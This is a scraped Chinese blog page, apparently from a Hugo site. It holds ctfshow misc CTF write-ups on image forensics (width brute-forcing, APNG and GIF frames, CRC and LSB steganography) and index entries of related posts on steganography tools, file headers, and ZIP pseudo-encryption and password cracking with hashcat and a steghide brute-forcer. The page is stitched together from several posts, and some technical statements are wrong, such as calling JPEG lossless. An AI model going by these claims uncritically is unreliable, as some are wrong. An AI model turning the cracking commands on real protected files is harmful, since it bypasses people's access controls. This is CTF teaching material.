这一道也是直接爆破，但是他有一个小小的很很可爱，因为他的高度不够，所以这里是埋了坑的，爆破前先吧高度给改了。 他这个宽高还是藏了的，所以搜一下03 84，常规操作。但是也有一点，他这个是jpg文件，新的脚本爆破一下吧\nimport zlib import struct filename = \u0026#34;misc35.jpg\u0026#34; with open(filename, \u0026#39;rb\u0026#39;) as f: all_b = f.read() #w = all_b[159:161] #h = all_b[157:159] for i in range(901,1200): name = str(i) + \u0026#34;.jpg\u0026#34; f1 = open(name,\u0026#34;wb\u0026#34;) im = all_b[:159]+struct.pack(\u0026#39;\u0026gt;h\u0026#39;,i)+all_b[161:] f1.write(im) f1.close() 这个Python脚本以二进制读取模式打开JPEG图像文件“misc35.jpg”，它尝试通过暴力破解来查找正确的宽度值。它遍历901到1200之间的所有宽度值，并在每次循环中创建一个新的JPEG文件。对于每个i值，它将缓存的原始图像数据读入内存（名为\u0026rsquo;all_b\u0026rsquo;），并使用struct.pack将新的宽度值编码为2字节的无符号整数。然后，它使用切片操作构建一个新的JPEG图片数据，将新的宽度值插入到正确位置上，并将其写入到新的JPEG文件。原始文件不会受到修改。\n请注意，JPEG文件结构与PNG文件和BMP文件不同，因此您需要使用不同的字节偏移量来提取JPEG的宽度和高度。在这种情况下，使用了偏移量159-160和161来提取高度和宽度信息。由于JPEG是无损压缩的，因此无需导入zlib库来处理数据。\nmisc36 出题人坦白从宽，正确的宽度在920-950之间\n这么好吗，直接给他奸了，当然不要忘了一件事，那就是他的高度需要改一下，改了改了。不要忘了，得全局修改\n好了，可以开始爆破了，或者用crc，这次我要自己写，我说的\nimport zlib import struct image=open(\u0026#34;misc36.gif\u0026#34;,\u0026#34;rb\u0026#34;).read() for i in range(920,950): image1=open(str(i-900)+\u0026#39;.gif\u0026#39;,\u0026#39;wb\u0026#39;) change=image[:image.index(b\u0026#39;\\x00\\x00\\x84\\x03\\x90\\x01\u0026#39;)+2]+struct.pack(\u0026#39;\u0026gt;h\u0026#39;,i)[::-1]+image[image.index(b\u0026#39;\\x00\\x00\\x84\\x03\\x90\\x01\u0026#39;)+4:] image1.write(change) image1.close() misc37 一眼看过去一直在闪，第一反应是有很多帧，就是有很多帧，但是不知道为什么我第一次显示的只有1帧，直接用stegsolve打开就可以了，焯\n但是打开stegsolve只有一帧。但是打开\n010看了一下，肯定不止一帧，因为光是高度就有两个，搜索84 03甚至能搜到3个，基本可以判断是文件头给删了，开头的估计是对的，感觉是后面的出错了，所以对比修复一下\nAPNG 可以动的png文件，只有积累，而且这类图片的一个技巧就是可以在浏览器中打开\n而且这个文件中的数据块包含一个 ftcl块，在010中也可以看出来。\nmisc38 这是一个会动的apng图片，要使用浏览器才能看出来，whatfu*k！\n我怎么知道，而且用stegsolve还看不出来，要用特殊的分离工具上面有提到，无语死\n这篇文章是关于apng的介绍，可以提供一些思路\n用工具APNG Disassembler分离，9、17、36、40帧中藏有flag\nmisc39 flag就像水，忽快忽慢地流\n怎么说呢，我自己是看不出来的，就是gif三件套，文件头，空间轴，和时间轴，这个gif变化忽快忽慢，这就是时间间隔了。利用工具提取，kali里用命令identify -format \u0026quot;%T \u0026quot; misc39.gif \u0026gt; misc39.txt提取帧数，\n37 37 36 36 36 37 37 37 37 37 36 37 36 36 37 37 36 36 37 37 36 37 37 37 36 36 37 37 37 37 36 37 36 36 36 37 37 36 37 37 37 37 37 37 37 36 37 37 37 37 37 37 37 36 37 37 36 37 37 36 37 36 37 36 37 37 36 36 37 36 36 37 37 37 36 36 36 36 37 37 36 36 36 37 36 37 37 36 36 37 36 37 37 36 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 37 36 37 37 36 37 36 37 37 37 36 36 37 37 36 37 37 36 36 36 37 36 36 37 37 36 37 37 37 37 37 36 36 36 37 36 37 37 36 36 37 36 37 36 37 37 36 36 37 36 36 37 37 36 37 37 36 36 37 37 37 36 36 36 37 37 36 36 37 36 36 36 37 37 37 36 36 37 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 37 36 36 36 36 37 36 37 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 36 37 36 37 37 36 36 36 37 37 37 37 36 36 36 36 37 36 37 37 36 36 36 36 36 37 37 36 37 36 36 36 37 37 36 37 36 37 36 37 37 37 36 36 37 37 37 37 37 37 36 37\n时间间隔就是这些，然后呢，哈哈哈哈哈哈，当然是一个0一个1，你问我那个是0，那个是1，肯定是小的是0大的是1，当然也比较好换，统一减去36就可以了，你问我太多了怎么办，我告诉你写个脚本就可以了，你问我脚本呢，我告诉你我直接用的chatgpt，\n然后放入010里面看看是何方神圣，不对这个二进制直接转化为ascil码，然后转化为字符就可以了\ns=\u0026#34;1 1 0 0 0 1 1 1 1 1 0 1 0 0 1 1 0 0 1 1 0 1 1 1 0 0 1 1 1 1 0 1 0 0 0 1 1 0 1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 0 1 1 0 1 1 0 1 0 1 0 1 1 0 0 1 0 0 1 1 1 0 0 0 0 1 1 0 0 0 1 0 1 1 0 0 1 0 1 1 0 0 1 1 0 1 1 0 0 1 1 0 0 1 1 1 0 0 1 0 1 1 1 0 0 1 0 1 1 0 1 0 1 1 1 0 0 1 1 0 1 1 0 0 0 1 0 0 1 1 0 1 1 1 1 1 0 0 0 1 0 1 1 0 0 1 0 1 0 1 1 0 0 1 0 0 1 1 0 1 1 0 0 1 1 1 0 0 0 1 1 0 0 1 0 0 0 1 1 1 0 0 1 0 1 1 0 1 1 0 0 1 1 0 0 1 1 1 1 0 0 0 0 1 0 1 1 1 0 0 1 1 1 0 0 1 0 1 1 1 0 0 0 1 0 1 1 0 0 0 1 1 1 1 0 0 0 0 1 0 1 1 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 1 0 1 1 1 0 0 1 1 1 1 1 1 0 1\u0026#34; flag=\u0026#34;\u0026#34; print(s) for i in range(82): s=s.replace(\u0026#39; \u0026#39;,\u0026#39;\u0026#39;) for i in range(41): flag +=chr(int(s[7*i:7*(i+1)],2)) #二进制，每隔7个二进制转化为ascil码，然后再转化为字符 print(flag) misc40 flag就像歌，有长有短仿佛岁月悠悠\n我就挺好奇的，这些apng图，我怎么才能看出来，直接打开工具给分离一下呗，毕竟都说flag像歌了，\n文件分离完成之后，在图片中找不到直接的flag了，但是如何才能找到呢，就要从文本文档入手了，可是这些文本又有什么用呢，打开看了一下，有序号，先用python给提取出\nflag=\u0026#34;\u0026#34; for i in range(1,69): f=open(\u0026#39;apngframe\u0026#39;+str(i).zfill(2)+\u0026#39;.txt\u0026#39;) s=f.read() flag += chr(int(s.split(\u0026#34;/\u0026#34;)[0][6:])) print(str(flag)) 直接运行就出了。但是有一些多余的\nmisc42 flag有多长，不太懂了，也不是个动图，打开010吧，看不出来。\n还是得懂得运用工具，我开了一下tweakpng。果然有问题，这个图片有着高达几十的idat块，先尝试删除试试再说。\n好吧，删了一堆还是没有变化，再看2cm，41位，肯定都别有深意，\n41位，这是flag的长度值，而且这个的idat块差不多有50个，这时候就要用到刚才说的长度了\n2cm，这个想表达的不是2，而是cm，对应的应该就是这个Length,现在就知道了，就是这一堆数，复制下来，转一下\na = [229,152,191,229,152,191,49,99,116,102,115,104,111,119,123,48,55,56,99,98,100,48,102,57,99,56,100,51,102,50,49,53,56,101,55,48,53,50,57,102,56,57,49,51,99,54,53,125] flag=\u0026#34;\u0026#34; for i in a: flag+=chr(i) print(flag) misc43 错误中通往这蕴涵正确的道路\n这句话很明显了。图片是个错误文件，但是电脑能打开呀，很熟悉，至少我知道的就有一种，那就是crc的错误，拿专业(bushi)工具，或者kali，就会报错，错误的crc for idat\n解决 第一个是试试修改图片的尺寸，不对，有蹊跷，妈的，不但有错误，还不止一个，首先有很多idat，其次就是基本每个idat都有错误\n，而且这次的长度值都一样，可能是crc的编码隐藏信息了。由于这里不好看出来具体是那个crc的错误，所以我先用另一个工具\npngdebugger PNG Debugger 可以进行读取 PNG 图片的数据，检测各数据块中的 CRC 是否正确，在 Windows 下使用。\n使用命令\nPNGDebugger.exe 文件路径 ---直接打开 PNGDebugger.exe misc44.png \u0026gt; 1.txt --导出来 注意一下，上面的才是crc的值，下面的虽然在tweakpng中有，但是似乎并不是想要的，而上面的才是我们需要的，可能上面的是正确的，不知\n我又看了一下，上面的可以在010里面搜到，但是下面的搜不到，所以说明下面的是修正后的，原来的crc，而上面的是被人为制造的，所以也恰恰说明了为什么上面的当中蕴含信息\nE59387E593A62E63746673686F777B36656232353839666666663565333930666536623837353034646263303839327D\nmisc44 错误中还有坑，那就是好消息，和上一道题一样呗，可能这道题，需要将图片修复，先用pngdebugger跑一下，还是有对有错，可能是因为不是全错的，这样的话就有很大的问题，因为正确的crc是自动生成的，不可能隐藏信息，所以只能把出错的找出来\n发现和上一题差的其实挺多的，因为这里有100多个错误的idat，就算全部都给他提取出来的话也太多了。所以考虑到了二进制，因为OK和FAILED可以作为0和1，至于哪个是0，那个是1，试一试呗，反正也就两种。至于怎么提取出来，还是得利用chatgpt\nwith open(\u0026#34;1.txt\u0026#34;) as f: lines = f.readlines() output = \u0026#34;\u0026#34; for i in range(5, len(lines), 6): # starting at line 6, increment by 6 if \u0026#34;OK\u0026#34; in lines[i]: output += \u0026#34;1\u0026#34; elif \u0026#34;FAILED\u0026#34; in lines[i]: output += \u0026#34;0\u0026#34; print(hex(int(output,2))[2:]) 此代码指定了一个以5为起点，以每6个为步长的范围，该范围包括名为1.txt的文本文件中的第六行和其倍数的行。 对于每个行索引（即i），代码检查该行是否包含OK或FAILED。如果找到了相应的标记，则代码将\u0026quot;0\u0026quot;或\u0026quot;1\u0026quot;添加到输出字符串。\n但是上面的代码存在错误，就是将二进制转化为了16进制，这样的得到的并不是正确答案，再转字符串就好了\nwith open(\u0026#34;1.txt\u0026#34;) as f: lines = f.readlines() binary_string = \u0026#34;\u0026#34; for i in range(5, len(lines), 6): # starting at line 6, increment by 6 if \u0026#34;OK\u0026#34; in lines[i]: binary_string += \u0026#34;1\u0026#34; elif \u0026#34;FAILED\u0026#34; in lines[i]: binary_string += \u0026#34;0\u0026#34; text_string = \u0026#34;\u0026#34; for j in range(0, len(binary_string), 8): byte = binary_string[j:j+8] decimal = int(byte, 2) character = chr(decimal) text_string += character print(text_string) 二进制转字符串，16进制转字符串之类的python脚本 misc45 说是换一种思维方式，估计是换题型了。图片混不拉基的，看看是不是idat的问题，这个没问题，但是确实不太一样，打开tweakpng确实藏着一些东西，但是不太明白是什么。搜一搜了得\n怎么说呢，正确的做法是将这个文件转化为bmp文件再接着做，题目中也有提示，就是尝试思维格式，转换网站网站可以在此，然后在拉进binwalk分析，有个flag.png,拿出来就ok了\n其实这一道题，拿到tweak打开时，会显示bmp的一些信息， 这个8bit的深度转换，是bmp的一个明显的特征。\nmisc46 打开是个gif动图，先逐帧看一下，看了一下没有动，问题应该不在那里，先看看题目要求\n直接看了看wp，实在没有什么思路，也算是对gif提题型的一种补充。用identify提取他的详细信息，identify misc46.gif \u0026gt;1.txt然后接下来就把他里面的坐标偏移量提取出来，利用画图工具输出gnuplot\nmisc47 那你知道笔仙吗，不知道，然后这又是一张apng，直接分解看看有没有信息，563张，和上一道题的帧数一样，可能差不多，直接打开来看看。都是100，看来这个delay值的作用不大了，去别的地方看看吧，这篇文章是关于apng的介绍，可以提供一些思路。简单来说就是每一个IDAT块前面都会有一个fcTL块，它其中就包含水平垂直偏移量，然后就写个代码，将里面的所有偏移量提取出来。我的大致思路，是将文件的16进制读取到文本中，然后把相应位置的数据提出来，因为每个\nfrom PIL import Image import re print(1) im =Image.new(\u0026#39;RGB\u0026#39;,(400,80),255) f=open(\u0026#39;output.txt\u0026#39;,\u0026#39;r\u0026#39;)#将图片的16制文件保存到这里，全选ctrl+shift+a就可以复制了 c=f.read() f.close() print(1) It =c.split(\u0026#34;6663544C\u0026#34;)#这段代码将字符串变量c按照字符串\u0026#34;6663544C(fcTL)\u0026#34;分割成一个列表变量lt。该字符串\u0026#34;6663544C\u0026#34;是用作分割符的特定字符串，根据实际数据格式可以进行更改。分割后，列表lt中的每个元素都是原始字符串中包含两个16进制坐标数据的子字符串。在后续代码中，程序通过解析并提取这些坐标数据，来处理或操作原始数据。 print(len(It),len(c)) for i in range(493): x=int(It[i][28:32],16)#找到x的偏移，取6663544C后的第28到31个字节，16是16进制，用于int的转化为整形 y=int(It[i][36:40],16) im.putpixel((x,y)) misc48 附件的第（Di）七（Qi）题（Ti）中有提示。本题略脑洞，可跳过\n首先这是一个jpg，看里面可能有exif信息，打开exitool看一下，没有什么。然后就注意题目，其实jpg中有个模块是DQT，选中查看，\n**ctfshow{32}**在题目中可以看到这个，那就知道了大体框架和字母的数字，然后再去看DQT模块的玄机。可以看到有很多FF，就要从就能从这个入手了\nmisc49 它们一来就是十六种。本题略脑洞，可跳过\n这是一个jpg图片，打开exif没有什么有用的信息，麻了，看了wp之后，再做一做。\n首先里面有很多字符串，看看他们的共同之处，他们共同点就是前面都有FF Ed的16进制\n​ 0c618671a13f5da394fb2a2238e44\nctfshow{0c618671a153f5da3948fdb2a2238e44}\nmisc50 有时候视线需要放低一点\n需要用stegsolve不停的切换图片通道就可以了。\nmisc51 你会数数吗\nmisc52 麻了，实在搞不懂\nLSB misc53 开始愉快的LSB\n确实愉快，直接开干吧，基础的LSB隐写，打开stegsolve，打开data extract，勾选red green blue的0位，然后勾选LSB first，就可以看到了\nmisc54 ","permalink":"https://modesty258.github.io/posts/misc/wp/","summary":"umi-ocr图片提取工具 misc1 解压就行 misc2 解压一个文本文件，然后打开都是乱码，打开010看一下 开头就是89 50可以知道了这是一个png文件，然后改为了txt后缀，把后缀改回来就可以了 misc3 解压完发现是一个bpg文件，没有什么技巧，直接查看就行了 misc4 这道题解压后有6个txt文件，和第二题一样","title":"Wp"},{"content":"师傅\n[挺好的]http://www.ga1axy.top/index.php/archives/6/#0x01%E5%9B%BE%E7%89%87%E7%9B%B8%E5%85%B3\n图片隐写术 元数据隐写 隐藏在图片的属性中，一般直接属性查看，或者用命令\nstrings：打印可直接打印的字符，可以发现隐藏的压缩包注释内容或者解压密码\ninentify：用于获取一个或多个图像文件的格式和特征，用于提取指定数据\npng图片 文件格式：文件头固定，剩下的有数据块组成\n文件头：89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块\nIHDR 文件头数据块，包含png图片的基本信息，由13个字节组成，只需要关注前八个字节包含宽和高\n经常会通过更改一张图片的高和宽来隐藏一些信息\nkali一般会打不开，提示文件错误，而在windows中可以打开，一般是修改了宽和高\nwp IDAT（图像数据块） IDAT隐写 使用pngcheck分析 pngcheck.exe -v file 判断异常IDAT串，使用winhex等工具创建新文件 根据创建后的新文件继续分析 IDAT：存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。\n储存图像像数数据。 在数据流中可包含多个连续顺序的图像数据块。 采用 LZ77 算法的派生算法进行压缩。 可以用 zlib 解压缩。 *** IDAT块只有当上一个块充满时，才会继续下一个新块。***\nIEND 图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。\n00 00 00 00 49 45 4E 44 AE 42 60 82 END 数据块的长度总是 00 00 00 00 ，数据标识总是 IEND 49 45 4E 44，因此，CRC 码也总是 AE 42 60 82。\nlsb隐写 LSB隐写，也就是最低有效位，图片中的像数一般是由三原色组成，这三原色也可以组成别的颜色。在png图片的存储中，每个颜色会有8bit，LSB隐写就是修改像数中最低的1bit，写入加密信息\n三原色为红蓝绿，每个颜色的二进制都为八位，那么转化为十进制就有256种，这三种的随机组合就有256的三次方，达到了很多位，正常眼睛就无法识别，那么就可以修改最低的二进制位然后来隐藏信息，最多可以隐藏3bit的信息而使图片没有变化(人眼无法识别)\n上图我们可以看到，十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。我修改最低有效位的信息的算法就叫做lsb加密算法，提取最低有效位信息的算法叫做lsb解密算法\njpg jphide F5 outguess 盲水印 相同的图片是异或或者盲水印，还有酷似的二维码。\n原图片为黑色背景，然后将图片加入新图片之中。\n异或 作图题 出现大量的010100，可能是二维码\n或者有很多的坐标，需要用到绘制，可以使用脚本。一般出现在gif和apng中，这类分离之后，会出现数据，或者在010中可以寻找到x，y。\n拼图 有一张打乱的图，还有一张原图，打乱的图里面可能包含着flag，使用gaps\nstegdetect (win) （检查jpg图片隐写方法,Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息）将图片复制到 stegdetect.exe 所在文件夹，打开 cmd 输入：\nstegdetect.exe -tjopi -s 10.0 [stego_file]\n-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。 -t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： j检测图像中的信息是否是用jsteg嵌入的。 o 检测图像中的信息是否是用outguess嵌入的。 p 检测图像中的信息是否是用jphide嵌入的。 i 检测图像中的信息是否是用invisible secrets嵌入的\nsteghide(win)\n查看图片中嵌入的文件信息：\nsteghide info out.jpg\n提取含有密码的隐藏内容：\nsteghide extract -sf out.jpg -p 123456\n提取不含有密码的隐藏内容：\nsteghide extract -sf out.jpg\nsteghide爆破密码\n有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法： https://github.com/Va5c0/Steghide-Brute-Force-Toolpython\nsteg_brute.py -b -d [字典] -f [jpg_file]\nF5\n(F5隐写，需要passwd）\n在kail下切换到F5-steganography，在java Extract运行命令：\njava Extract 123456.jpg图片的绝对地址 -p 123456\noutguess\n(kali下图片隐写+可需要可不要passwd）\noutguess -r /root/angrybird.jpg(绝对路径) 123.txt(信息存放的文本) outguess -k 12345 -r 2.jpg out.txt -k后接密码 -r后接解密图片 输出文件\n","permalink":"https://modesty258.github.io/posts/misc/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/","summary":"师傅 [挺好的]http://www.ga1axy.top/index.php/archives/6/#0x01%E5%9B%BE%E7%89%87%E7%9B%B8%E5%85%B3 图片隐写术 元数据隐写 隐藏在图片的属性中，一般直接属性查看，或者用命令 strings：打印可直接打印","title":"图片隐写"},{"content":"​\n文件头篇 一、文件头文件尾 1、图片 JPEG 文件头：FF D8 FF 文件尾：FF D9 TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00 PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82 GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M) TIFF (tif) 文件头：49 49 2A 00 ico 文件头：00 00 01 00 Adobe Photoshop (psd) 文件头：38 42 50 53 2、office文件 MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0 MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4A WordPerfect (wpd) 文件头：FF 57 50 43 Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2E application/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1 Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A Outlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6F Outlook (pst) 文件头：21 42 44 4E Rich Text Format (rtf) 文件头：7B 5C 72 74 66 txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的 3、压缩包文件 ZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4B RAR Archive (rar) 文件头：52 61 72 21 4、音频文件 Wave (wav) 文件头：57 41 56 45 audio(Audio) 文件头： 4D 54 68 64 audio/x-aac（aac） 文件头：FF F1(9) 5、视频文件 AVI (avi) 文件头：41 56 49 20 Real Audio (ram) 文件头：2E 72 61 FD Real Media (rm) 文件头：2E 52 4D 46 MPEG (mpg) 文件头：00 00 01 BA(3) Quicktime (mov) 文件头：6D 6F 6F 76 Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11 MIDI (mid) 文件头：4D 54 68 64 6、代码文件 XML (xml) 文件头：3C 3F 78 6D 6C HTML (html) 文件头：68 74 6D 6C 3E Quicken (qdf) 文件头：AC 9E BD 8F Windows Password (pwl) 文件头：E3 82 85 96 7、其他类型 windows证书文件(der) 文件头：30 82 03 C9 CAD (dwg) 文件头：41 43 31 30 Windows Shortcut (lnk) 文件头：4C 00 00 00 Windows reg(reg) 文件头：52 45 47 45 44 49 54 34 压缩包隐写类 ","permalink":"https://modesty258.github.io/posts/misc/%E6%96%87%E4%BB%B6%E5%A4%B4/","summary":"​ 文件头篇 一、文件头文件尾 1、图片 JPEG 文件头：FF D8 FF 文件尾：FF D9 TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00 PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82 GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M) TIFF (tif) 文件头：49 49 2A 00 ico 文件头：00 00","title":"文件头"},{"content":"​\nzip常见文件头 伪加密 50 4B .PK\n原理：ZIP伪加密是在文件头的加密标志位进行修改，进而再次打开文件时被识别为加密压缩包。\nZIP文件主要由三个部分组成：压缩源文件数据区 + 核心目录 + 目录结束标志\n压缩源文件数据区\nlocal file header + file data + data descriptor 伪加密修改的几种方法 360直接通杀 检测伪加密的工具，zipcenop解密后可以直接打开，打不开就不是伪加密 java -jar ZipCenOp.jar r lm.zip\n使用010等工具修改 补充： 关于加密的一些补充\n如果把一个压缩包的文件头和加密标志位进行适当修改，那就可能会改变文件的可读性。\n如果改变压缩源文件数据区的全局方式位标记 既【第一个全局方式位标记】：结果会出现不会出现zip伪加密。 如果改变压缩源文件目录区的全局方式位标记 既【第二个全局方式位标记】（修改为09 00 这个数字可以不是9只要是奇数就好）：结果会出现zip伪加密【只要末位是奇数，就代表加密，反之，末位是偶数代表未加密】 如果修改zip文件头（50 4B 03 04）修改成其他数据：结果出现压缩包损坏，导致文件无法解压。 无加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为00 00\n伪加密 压缩源文件数据区的全局加密应当为00 00 且压缩源文件目录区的全局方式位标记应当为09 00\n真加密 压缩源文件数据区的全局加密应当为09 00 且压缩源文件目录区的全局方式位标记应当为09 00\n源文件数据区决定是否加密，而目录区的全局定位方式决定是否显示加密\n暴力破解 推荐工具：ARCHPR\n掩码攻击 原理:已知密码的某一位，可以构造??a???进项掩码攻击\n例题 明文攻击 原理：因为同一个压缩包使用同一个加密密钥来加密，所以可以使用已知文件来解出其他加密文件。\ncrc32碰撞 wp hashcat hashcat -m 11500 -a 3 xxxxxx:00000000 ?a?a?a?a?a?a --这是爆破的命令 hashcat -m 11500 -a 3 xxxxxx:00000000 ?a?a?a?a?a?a --show --展示明文 先把几个crc32值列出来\n8cfcb81c passwo\n145383d1 rdiscl\n86f17134\n3a9eb11a\n15b89588\n7c07412c\n1d7cb767\ndocx文件 包含xml文件的zip文件，可以看到开头就是504B\nwp misc 2 这是一道伪加密，利用的是修改文件头的加密标志位来达到使压缩包产生密码的效果\n这一道题的标志位就特别明显，就是在pk后面的14，14后第二位应该是00，但是修改为其他，就造成了加密\n只需要将这些09改为00，就可以去除加密，但是我手动改完后显示文件损坏，就先用工具破解了\nzipcenop 使用工具后还是显示文件损坏，就知道应该不是揭秘出错，而是存在作者的修改，需要文件修复（我猜的）\n看到文件中有6个小文件，我就来试试直接破解，当然是妄想天开\n","permalink":"https://modesty258.github.io/posts/misc/%E5%8E%8B%E7%BC%A9%E5%8C%85/","summary":"​ zip常见文件头 伪加密 50 4B .PK 原理：ZIP伪加密是在文件头的加密标志位进行修改，进而再次打开文件时被识别为加密压缩包。 ZIP文件主要由三个部分组成：压缩源文件数据区 + 核心目录 + 目录结束标志 压缩源文件数据区 local file header + file data + data descriptor 伪加密修改的几种方法 360直接通杀 检测伪加密的工具，zip","title":"压缩包"},{"content":"​\n文件分离工具及使用方法 foremost 基本命令 foremost 文件名\n执行命令后，会在当前文件夹生成output\n也可以直接把需要分离的文件拖到foremost，目前我的windows上比较难用，准备研究一下linux的用法\nbinwalk 工具使用\n#查看帮助 python -m binwalk -h #分析文件 python -m binwalk 文件名 #提取文件 python -m binwalk -e wp 第一个文件是一个图片，很简单，就是基本的一个隐写，直接用foremost分离了就出来了。\nflag{E0D6DEE1-33F0-42E1-9609-ECDFFFE5276C}\ndd 半自动化分离 zsteg 可以检测png和bmp图片中的隐藏数据\n目前，zsteg支持检测：\nPNG 和 BMP 格式的 LSB 隐写术 zlib 压缩数据 打开Stego Camouflage 1.2.1 LSB 查看lsb数据 zsteg xxx.bmp zsteg xxx.png zsteg -a(file_name) #查看各个通道的lsb 检测zlib #-b的位数是从1开始的 zsteg zlib.bmp -b 1 -o xy -v 提取该通道图片 zsteg -e b8,a,lsb,xy 文件.png -\u0026gt; 1.png(可以是任何，文本啥的都行) 对于不同的类别，提取当中的隐藏数据也有不同的的命令，\n-E, --extract NAME extract specified payload, NAME is like '1b,rgb,lsb'\n对于lsb之类的就会用到这一条命令\n应用 用zsteg检测出来的extradata:0 ，是在这个里面存在隐藏数据，所以应该将这个文件给提取出来，所以就有了\nzsteg -E “extradata:0” misc17.png \u0026gt; 1.txt 就是将misc17.png里面的extradata:0提到1.txt里面\n","permalink":"https://modesty258.github.io/posts/misc/%E6%96%87%E4%BB%B6%E5%88%86%E5%89%B2/","summary":"​ 文件分离工具及使用方法 foremost 基本命令 foremost 文件名 执行命令后，会在当前文件夹生成output 也可以直接把需要分离的文件拖到foremost，目前我的windows上比较难用，准备研究一下linux的用法 binwalk 工具使用 #查看帮助 python -m binwalk -h #分析文件 python -m binwalk 文件名 #提取文件 python -m binwalk -e wp 第一个文件是一个","title":"文件分割"},{"content":"使用Git更新Hugo 个人博客 该文章主要是讨论，如何在本地搭建好hugo静态网页后，上传git到自己的域名下。而且每天进行实时更新。\n第一次git push hugo # 生成public cd public git init git remote add origin https://github.com/xxx/xxx.github.io #填写自己的域名 git add . git commit -m \u0026#34;hugo\u0026#34; git push -u origin master 这个基本都会了，不然网站也没法使用\n第二次push 为什么要第二次，很简单，就是如何更新你的博客，当你在本地生成的新的文章，就得上传到网站\n#进入到根目录下 hugo #假设你已经完成.md更新 # 第二次生成public cd public git init git remote add origin https://github.com/xxx/xxx.github.io #填写自己的域名 git add -A git commit -m \u0026#34;update-hugo\u0026#34; git push origin master # git push -f origin master（实在传不上去的时候用，记得备份） 一键部署 ","permalink":"https://modesty258.github.io/posts/blog/%E4%BD%BF%E7%94%A8git%E6%9B%B4%E6%96%B0hugo%E4%B8%AA%E4%BA%BAblog/","summary":"使用Git更新Hugo 个人博客 该文章主要是讨论，如何在本地搭建好hugo静态网页后，上传git到自己的域名下。而且每天进行实时更新。 第一次git push hugo # 生成public cd public git init git remote add origin https://github.com/xxx/xxx.github.io #填写自己的域名 git add . git commit -m \u0026#34;hugo\u0026#34; git push -u origin master 这个基本都会了，不然网站也没法使用 第二次push 为什么要","title":"使用git更新hugo个人blog"},{"content":"​\n常见编码特征 粘个链接：[30种常见编码]https://cloud.tencent.com/developer/article/1748394\n在线解码：https://ctf.bugku.com/tools.html\nbase家族 base16 base32 base58 base62 base64 base91 base91 base100\n1. Base64——示例YWRtaW4tcm9vdA== 一般尾部会带两个等号，明文少的可以没有\n原理：转化为ascil码\u0026mdash;转化为二进制\u0026mdash;8位变6位\u0026mdash;6位补零\u0026ndash;转化为十进制\u0026mdash;-ascil码对照 如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=’，因此编码后输出的文本末尾可能会出现1或2个‘=’\nbase64与url转化问题 有时为了绕过，会使用base64读取，但是url有时会将标准Base64中的“/”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符\n解决：可以使用改进后的base64，将“/”和“+”字符改成了“-”和“_”，就会避免上面的问题\nBase64转换后比原有的字符串长1/3 因为由八字节转化为六字节，再补两个高位零，这样理论会多出三分之一\nBase64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题\n2. Base58——示例6tmHCZvhgfNjQu 最大的特点就是没有等号\nBase58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。\n相比Base64，Base58不使用数字\u0026quot;0\u0026quot;，字母大写\u0026quot;O\u0026quot;，字母大写\u0026quot;I\u0026quot;，和字母小写\u0026quot;l\u0026quot;，以及\u0026quot;+“和”/\u0026ldquo;符号。\n比特币的Base58字母表：\n123456789\nABCDEFGHJKLMNPQRSTUVWXYZ\nabcdefghijkmnopqrstuvwxyz\n简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。\n可以理解为58进制，但是去除了0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）\n3.Base32——示例GEZDGNBVGY3TQOJQGE====== 明文超过10个以后就会有很多的等号\n填充“=”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“=”符号\n原理：与base64差不多，将原来的二进制分为5位，然后高位加0变成8位。如果不是5和8的公因数就会补充0 字母表:\n0 A 8 I 16 Q 24 Y 1 B 9 J 17 R 25 Z 2 C 10 K 18 S 26 2 3 D 11 L 19 T 27 3 4 E 12 M 20 U 28 4 5 F 13 N 21 V 29 5 6 G 14 O 22 W 30 6 7 H 15 P 23 X 31 7 无大小写，基本全是大写或小写 可以作为文件名，不含符号 排除了一些字符 